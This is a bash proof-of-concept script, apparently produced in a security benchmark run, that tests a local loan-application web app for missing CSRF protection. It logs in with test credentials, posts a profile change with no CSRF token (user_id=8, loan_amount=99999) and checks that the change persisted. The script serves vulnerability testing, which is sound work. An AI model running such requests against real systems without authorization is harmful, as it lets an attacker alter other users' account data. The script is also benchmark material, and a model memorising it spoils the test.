#!/bin/bash
# POC: Demonstrates CSRF vulnerability on POST /profile endpoint by successfully modifying profile without CSRF token
# Target: ./repo
# Created: 2025-11-07T16:20:49.542Z
# Session: benchmark-XBEN-023-24-mhp1zrww

# CSRF Vulnerability POC - Profile Update Endpoint
# This script demonstrates that profile modifications can be made without CSRF token validation

TARGET_URL="${1:-http://localhost:5000}"
PROFILE_ENDPOINT="${TARGET_URL}/profile"
LOGIN_ENDPOINT="${TARGET_URL}/login"
HOME_ENDPOINT="${TARGET_URL}/home"

echo "[*] CSRF Vulnerability Test - Profile Update Endpoint"
echo "[*] Target: ${PROFILE_ENDPOINT}"
echo ""

# Create a temporary cookie jar
COOKIE_JAR=$(mktemp)
trap "rm -f ${COOKIE_JAR}" EXIT

# Step 1: Login with test credentials to establish a session
echo "[Step 1] Logging in with test credentials to establish authenticated session..."
LOGIN_RESPONSE=$(curl -s -c "${COOKIE_JAR}" -X POST "${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "${LOGIN_RESPONSE}" | tail -n 1)
RESPONSE_BODY=$(echo "${LOGIN_RESPONSE}" | sed '$d')

if [ "${HTTP_CODE}" = "302" ]; then
  echo "[+] Login successful (HTTP 302 redirect)"
else
  echo "[-] Login failed. HTTP Code: ${HTTP_CODE}"
  echo "${RESPONSE_BODY}"
  exit 1
fi

# Step 2: Retrieve the profile page to check for CSRF token
echo ""
echo "[Step 2] Retrieving profile page to check for CSRF token protection..."
PROFILE_PAGE=$(curl -s -b "${COOKIE_JAR}" "${PROFILE_ENDPOINT}")

# Check if CSRF token is present in the form
if echo "${PROFILE_PAGE}" | grep -q "csrf_token"; then
  echo "[-] CSRF token field found in form (protection may be in place)"
else
  echo "[+] No CSRF token field detected in profile form"
fi

# Check for any hidden input fields
HIDDEN_FIELDS=$(echo "${PROFILE_PAGE}" | grep -o '<input type="hidden"[^>]*>' | wc -l)
echo "[*] Hidden input fields detected: ${HIDDEN_FIELDS}"

# Step 3: Perform CSRF attack - modify profile without CSRF token
echo ""
echo "[Step 3] Attempting to modify profile WITHOUT providing CSRF token..."
echo "[*] Sending CSRF payload to modify user profile..."

CSRF_ATTACK=$(curl -s -b "${COOKIE_JAR}" -c "${COOKIE_JAR}" -X POST "${PROFILE_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user_id=8&name=CSRF_Victim&lastname=TestUser&email=csrf_victim@test.com&loan_amount=99999&loan_term_months=120&monthly_payment=1111" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "${CSRF_ATTACK}" | tail -n 1)
RESPONSE_BODY=$(echo "${CSRF_ATTACK}" | sed '$d')

if [ "${HTTP_CODE}" = "302" ] || [ "${HTTP_CODE}" = "200" ]; then
  echo "[+] CSRF attack successful! Profile modified without CSRF token validation"
  echo "[+] Server responded with HTTP ${HTTP_CODE}"
  echo "[+] VULNERABILITY CONFIRMED: No CSRF token validation on POST /profile"
else
  echo "[-] CSRF attack rejected (possible CSRF protection in place)"
  echo "[*] Server responded with HTTP ${HTTP_CODE}"
  echo "${RESPONSE_BODY}"
  exit 1
fi

# Step 4: Verify the modification persisted
echo ""
echo "[Step 4] Verifying profile modifications were persisted..."
VERIFY_PROFILE=$(curl -s -b "${COOKIE_JAR}" "${PROFILE_ENDPOINT}?user_id=8")

if echo "${VERIFY_PROFILE}" | grep -q "CSRF_Victim\|csrf_victim@test.com"; then
  echo "[+] CSRF modification verified in database"
  echo "[+] Profile data persisted successfully"
  echo ""
  echo "========================================================"
  echo "VULNERABILITY CONFIRMED: CSRF Token Protection Missing"
  echo "========================================================"
  echo "The profile endpoint accepts state-changing requests (POST)"
  echo "without validating CSRF tokens, allowing attackers to"
  echo "perform unauthorized profile modifications."
  exit 0
else
  echo "[*] Could not verify modification (check application state)"
  exit 0
fi